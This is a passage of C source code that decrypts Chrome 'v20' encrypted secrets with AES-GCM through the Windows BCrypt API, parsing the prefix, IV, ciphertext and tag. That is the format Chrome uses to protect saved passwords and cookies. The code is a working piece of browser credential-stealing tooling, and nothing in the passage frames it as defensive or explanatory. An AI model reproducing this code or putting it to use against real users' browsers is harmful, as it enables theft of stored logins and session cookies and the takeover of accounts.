    if ((ntStatus = BCryptDecrypt(hKey, pbCiphertext, cbCiphertext, &AuthInfo, NULL, 0, pbPlaintext, dwPlaintext, &cbResult, 0)) != 0)
    {
        DBGA("[!] BCryptDecrypt Failed With Error: 0x%08X", ntStatus);
        goto _END_OF_FUNC;
    }

    *ppbPlaintext   = pbPlaintext;
    *pcbPlaintext   = (DWORD)cbResult;
    pbPlaintext     = NULL;
    bResult         = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbPlaintext);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

BOOL DecryptChromeV20Secret(IN PBYTE pbKey, IN DWORD cbKey, IN PBYTE pbEncryptedSecret, IN DWORD cbEncryptedSecret, OUT PBYTE* ppbDecryptedSecret, OUT PDWORD pcbDecryptedSecret)
{
    PBYTE   pbIv            = NULL;
    PBYTE   pbCiphertext    = NULL;
    PBYTE   pbTag           = NULL;
    DWORD   cbCiphertext    = 0x00;
    DWORD   cbMinSize       = CHROME_V20_PREFIX_SIZE + AES_GCM_IV_SIZE + AES_GCM_TAG_SIZE;

    if (!pbKey || !pbEncryptedSecret || !ppbDecryptedSecret || !pcbDecryptedSecret)
        return FALSE;

    // Verify Secret
    if (cbEncryptedSecret <= cbMinSize || (*(PDWORD)pbEncryptedSecret & 0x00FFFFFF) != CHROME_V20_PREFIX)
    {
        DBGA("[!] Invalid Secret: %lu bytes", cbEncryptedSecret);
        return FALSE;
    }

    // Parse structure: [v20 (3)] [IV (12)] [Ciphertext (N)] [Tag (16)]
    pbIv            = pbEncryptedSecret + CHROME_V20_PREFIX_SIZE;
    cbCiphertext    = cbEncryptedSecret - CHROME_V20_PREFIX_SIZE - AES_GCM_IV_SIZE - AES_GCM_TAG_SIZE;
    pbCiphertext    = pbIv + AES_GCM_IV_SIZE;
    pbTag           = pbCiphertext + cbCiphertext;

    return DecryptAesGcm(pbKey, cbKey, pbIv, AES_GCM_IV_SIZE, pbCiphertext, cbCiphertext, pbTag, AES_GCM_TAG_SIZE, ppbDecryptedSecret, pcbDecryptedSecret);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
